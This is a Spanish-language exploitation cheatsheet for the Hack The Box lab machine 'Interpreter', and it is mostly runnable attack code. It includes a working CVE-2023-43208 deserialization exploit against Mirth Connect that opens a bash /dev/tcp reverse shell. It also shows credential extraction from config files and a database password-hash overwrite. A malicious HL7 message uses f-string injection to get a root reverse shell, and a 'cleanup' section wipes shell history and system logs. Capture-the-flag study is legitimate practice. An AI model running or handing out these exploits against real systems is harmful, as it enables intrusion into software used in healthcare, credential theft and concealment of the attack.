# INTERPRETER HTB - Cheatsheet de Comandos

## 🔍 FASE 1: RECONOCIMIENTO

```bash
# Escaneo de puertos
nmap -sV -sC -p- 10.129.1.43 --min-rate 5000

# Identificación de Mirth Connect
curl -s http://10.129.1.43/mirth-connect/ | grep -i "version\|mirth"

# Verificar puertos abiertos
ss -tlnp 2>/dev/null | grep LISTEN
```

---

## 💥 FASE 2: RCE vía CVE-2023-43208

### Confirmar versión vulnerable
```bash
curl -sk https://TARGET/api/server/version -H "X-Requested-With: OpenAPI"
# 4.4.0
```

### Crear rce.py (reverse shell)
```python
#!/usr/bin/env python3
import requests, sys, warnings
warnings.filterwarnings('ignore')

def build_payload(cmd):
    cmd = cmd.replace("&","&amp;").replace("<","&lt;").replace(">","&gt;").replace('"',"&quot;").replace("'","&apos;")
    return f"""<sorted-set>
    <string>abcd</string>
    <dynamic-proxy>
        <interface>java.lang.Comparable</interface>
        <handler class="org.apache.commons.lang3.event.EventUtils$EventBindingInvocationHandler">
            <target class="org.apache.commons.collections4.functors.ChainedTransformer">
                <iTransformers>
                    <org.apache.commons.collections4.functors.ConstantTransformer>
                        <iConstant class="java-class">java.lang.Runtime</iConstant>
                    </org.apache.commons.collections4.functors.ConstantTransformer>
                    <org.apache.commons.collections4.functors.InvokerTransformer>
                        <iMethodName>getMethod</iMethodName>
                        <iParamTypes><java-class>java.lang.String</java-class><java-class>[Ljava.lang.Class;</java-class></iParamTypes>
                        <iArgs><string>getRuntime</string><java-class-array/></iArgs>
                    </org.apache.commons.collections4.functors.InvokerTransformer>
                    <org.apache.commons.collections4.functors.InvokerTransformer>
                        <iMethodName>invoke</iMethodName>
                        <iParamTypes><java-class>java.lang.Object</java-class><java-class>[Ljava.lang.Object;</java-class></iParamTypes>
                        <iArgs><null/><object-array/></iArgs>
                    </org.apache.commons.collections4.functors.InvokerTransformer>
                    <org.apache.commons.collections4.functors.InvokerTransformer>
                        <iMethodName>exec</iMethodName>
                        <iParamTypes><java-class>java.lang.String</java-class></iParamTypes>
                        <iArgs><string>{cmd}</string></iArgs>
                    </org.apache.commons.collections4.functors.InvokerTransformer>
                </iTransformers>
            </target>
            <methodName>transform</methodName>
            <eventTypes><string>compareTo</string></eventTypes>
        </handler>
    </dynamic-proxy>
</sorted-set>"""

target = sys.argv[1]
lhost = sys.argv[2]
lport = sys.argv[3]

cmd = f"sh -c $@|sh . echo bash -c '0<&53-;exec 53<>/dev/tcp/{lhost}/{lport};sh <&53 >&53 2>&53'"
print(f"[*] Target: {target}")
print(f"[*] Callback: {lhost}:{lport}")
print(f"[*] Sending payload...")

r = requests.post(
    f"https://{target}/api/users",
    headers={"Content-Type":"application/xml","X-Requested-With":"OpenAPI"},
    data=build_payload(cmd),
    verify=False, timeout=20
)
print(f"[+] Sent! Status: {r.status_code}")
```

### Lanzar exploit
```bash
# Terminal 1: Listener
nc -nlvp 4444

# Terminal 2: Exploit
python3 rce.py TARGET LHOST 4444
# [+] Sent! Status: 500  <-- normal, el RCE ya se ejecutó

# Terminal 1: Shell recibida
# Connection received on TARGET
# $ whoami
# mirth
```

### Alternativa: ejecutar comandos con output (rce_cmd.py)

Ver archivo GUIA_RCE_CVE-2023-43208.md para el script rce_cmd.py completo.

```bash
# Ejecutar comando y ver output via HTTP callback
python3 rce_cmd.py TARGET LHOST 8888 "id"
# [+] Output:
# uid=103(mirth) gid=111(mirth) groups=111(mirth)

python3 rce_cmd.py TARGET LHOST 8888 "cat /home/mirth/user.txt"
```

---

## 📚 FASE 3: MOVIMIENTO LATERAL

### Encontrar Credenciales de BD
```bash
# Obtener PID de Mirth
MIRTH_PID=$(pgrep -f 'MirthLauncher')
echo $MIRTH_PID

# Acceder a archivo de configuración
cat /proc/$MIRTH_PID/cwd/conf/mirth.properties | grep -i "database"

# Extraer credenciales
DB_USER=$(grep "database.username=" /proc/$MIRTH_PID/cwd/conf/mirth.properties | cut -d'=' -f2)
DB_PASS=$(grep "database.password=" /proc/$MIRTH_PID/cwd/conf/mirth.properties | cut -d'=' -f2)
echo "Usuario: $DB_USER"
echo "Contraseña: $DB_PASS"
# Usuario: mirthdb
# Contraseña: MirthPass123!
```

### Conectar a MySQL
```bash
# Conexión interactiva
mysql -h localhost -u mirthdb -p'MirthPass123!' mc_bdd_prod

# Ver usuarios
mysql> SELECT PERSON_ID, NAME FROM PERSON LIMIT 5;

# Ver estructura de hash
mysql> DESCRIBE PERSON_PASSWORD;

# Ver hash de usuario (ejemplo PERSON_ID=2)
mysql> SELECT PERSON_ID, PASSWORD FROM PERSON_PASSWORD WHERE PERSON_ID=2;
```

### Generar PBKDF2 Hash
```bash
# Script Python inline
python3 << 'EOF'
import hashlib
import base64
import os

password = "NewPassword123!"
salt = os.urandom(8)

hash_output = hashlib.pbkdf2_hmac(
    'sha256',
    password.encode('utf-8'),
    salt,
    600000,
    dklen=32
)

combined = salt + hash_output
hash_base64 = base64.b64encode(combined).decode('utf-8')

print(f"Hash PBKDF2: {hash_base64}")
EOF
```

### Actualizar Contraseña en BD
```bash
# Copiar el hash generado y ejecutar:
mysql -h localhost -u mirthdb -p'MirthPass123!' mc_bdd_prod << EOF
UPDATE PERSON_PASSWORD 
SET PASSWORD='PASTE_HASH_HERE' 
WHERE PERSON_ID=2;
EOF

# Verificar actualización
mysql -h localhost -u mirthdb -p'MirthPass123!' mc_bdd_prod \
  -e "SELECT PERSON_ID, PASSWORD FROM PERSON_PASSWORD WHERE PERSON_ID=2;"
```

---

## 🔧 FASE 4: ESCALADA A ROOT

### Descubrir notif.py
```bash
# Buscar servicio en puerto 54321
ss -tlnp 2>/dev/null | grep 54321
# LISTEN root /usr/bin/python3 /usr/local/bin/notif.py

# Verificar que escuche
curl -s http://localhost:54321/notify -X POST \
  -H "Content-Type: application/json" \
  -d '{"firstname":"test","lastname":"test"}' | jq .
```

### Crear Canal Mirth (vía Web UI o API)
```bash
# Acceder a UI Mirth con credenciales nuevas
# http://10.129.1.43/mirth-connect
# Usuario: admin
# Contraseña: NewPassword123!

# O crear via API
curl -X POST "http://10.129.1.43/mirth-connect/api/channels" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer TOKEN" \
  -d '{
    "name": "INTERPRETER - HL7 TO NOTIFY",
    "sourceConnector": {
      "transportName": "MLLP Listener",
      "port": 6661
    },
    "destinationConnectors": [{
      "transportName": "HTTP Post",
      "url": "http://localhost:54321/notify"
    }]
  }'
```

### Enviar Payload HL7 Malicioso
```bash
# Terminal 1: Listener para reverse shell
nc -nlvp 5555

# Terminal 2: Enviar HL7 con payload
cat > /tmp/hl7_payload.txt << 'EOF'
MSH|^~\&|SendingApp|SendingFac|ReceivingApp|ReceivingFac|20230915120000||ADT^A01|MSG001|P|2.3
EVN|A01|20230915120000
PID|||000001||{__import__('os').system('bash -c "bash -i >& /dev/tcp/10.10.16.5/5555 0>&1"')}^TestLastName||19800101|M
EOF

# Enviar mensaje HL7 (MLLP wrapped)
python3 << 'PYSCRIPT'
import socket
import sys

hl7_content = open('/tmp/hl7_payload.txt').read()
mllp_message = b'\x0b' + hl7_content.encode() + b'\x1c\x0d'

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('localhost', 6661))
sock.sendall(mllp_message)
sock.close()
PYSCRIPT
```

### Verificar Shell Root
```bash
# En listener nc:
nc -nlvp 5555
# [conecta máquina]
# bash-5.1# whoami
# root

# Obtener flag
cat /root/root.txt
# 92a459b1e230f362acf4268116917dec
```

---

## 📋 COMANDOS RÁPIDOS

### Flag Usuario
```bash
cat /home/mirth/user.txt
# 3f21ca6e658708c931336bd4e3afc402
```

### Flag Root
```bash
cat /root/root.txt
# 92a459b1e230f362acf4268116917dec
```

### Verificar Acceso
```bash
# Como mirth
whoami
id
pwd

# Como root
whoami
id
cat /etc/shadow
```

### Limpiar Logs (post-explotación)
```bash
# Eliminar evidencia
history -c
rm -rf ~/.bash_history
cat /dev/null > /var/log/auth.log
cat /dev/null > /var/log/syslog
```

---

## 🔑 Credenciales Clave

| Servicio | Usuario | Contraseña | Notas |
|----------|---------|-----------|-------|
| Mirth Web UI | admin | NewPassword123! | Generado con PBKDF2 |
| MySQL | mirthdb | MirthPass123! | Extraído de mirth.properties |
| SSH (Mirth) | mirth | - | RCE via CVE-2023-43208 |
| notif.py | - | - | Corre como root, vulnerable a f-string |

---

## 🐛 Troubleshooting Rápido

```bash
# Problema: "Connection refused" a puerto 6661
# Solución: Verificar que Mirth esté corriendo
curl -s http://10.129.1.43/mirth-connect/api/server/version

# Problema: requests module no encontrado
# Solución: pip install requests
pip install requests

# Problema: "Access denied" a MySQL
# Solución: Verificar credenciales extraídas de conf
grep "database.password=" /proc/$MIRTH_PID/cwd/conf/mirth.properties

# Problema: Reverse shell no conecta
# Solución: Verificar IP y puerto correcto
ifconfig | grep inet
ss -tlnp | grep 5555

# Problema: notif.py no recibe payload
# Solución: Verificar que canal Mirth esté creado y activo
curl -s http://localhost:54321/notify -X POST -H "Content-Type: application/json" -d '{"test":"test"}'
```

---

## ⚙️ Automatización Completa

```bash
#!/bin/bash
# Script all-in-one (solo requiere python3 + requests)

TARGET="10.129.1.110"
LHOST="10.10.14.2"
LPORT=4444
LPORT_ROOT=5555

echo "[*] Fase 1: Confirmar versión"
curl -sk https://$TARGET/api/server/version -H "X-Requested-With: OpenAPI"

echo "[*] Fase 2: RCE via CVE-2023-43208"
# Terminal separada: nc -nlvp $LPORT
python3 rce.py $TARGET $LHOST $LPORT

echo "[*] Fase 3: Extrayendo credenciales BD (en shell mirth)"
# MIRTH_PID=$(pgrep -f MirthLauncher)
# grep "database.password=" /proc/$MIRTH_PID/cwd/conf/mirth.properties

echo "[*] Fase 4: Escalada a Root"
# Enviar payload HL7 malicioso a puerto 6661
# nc -nlvp $LPORT_ROOT

echo "[+] ¡Hecho!"
```

---

## 📌 Resumen Rápido

```
RCE (mirth)     →  CVE-2023-43208 vía /api/users
Escalada Lateral →  Extrae BD creds vía /proc/PID/cwd/conf/
Hash DB         →  PBKDF2 generado localmente
Escalada Root   →  f-string injection en notif.py (HL7)
Flag User       →  /home/mirth/user.txt
Flag Root       →  /root/root.txt
```

**Tiempo total:** ~30-45 minutos (manual)
**Dificultad:** Media
**Máquina:** INTERPRETER (HTB)
